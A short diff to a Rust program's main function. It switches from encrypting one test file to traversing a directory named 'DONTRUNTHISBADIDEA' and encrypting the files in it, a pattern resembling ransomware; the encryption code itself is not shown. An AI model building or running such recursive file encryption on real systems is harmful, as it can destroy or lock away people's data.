@@ -6,11 +6,11 @@ use std::path::Path;
 fn main() -> io::Result<()> {
 
     // single file encryption test
-    let file_path = "message.txt";
-    crypto::encrypt(file_path);
+    //let file_path = "message.txt";
+    //crypto::encrypt(file_path);
 
-    // directory traversal test
-    let root = Path::new(".");
+    // traverse directory and encrypt files
+    let root = Path::new("DONTRUNTHISBADIDEA");
     traverse::visit_dirs(root)?;
     Ok(())
 }
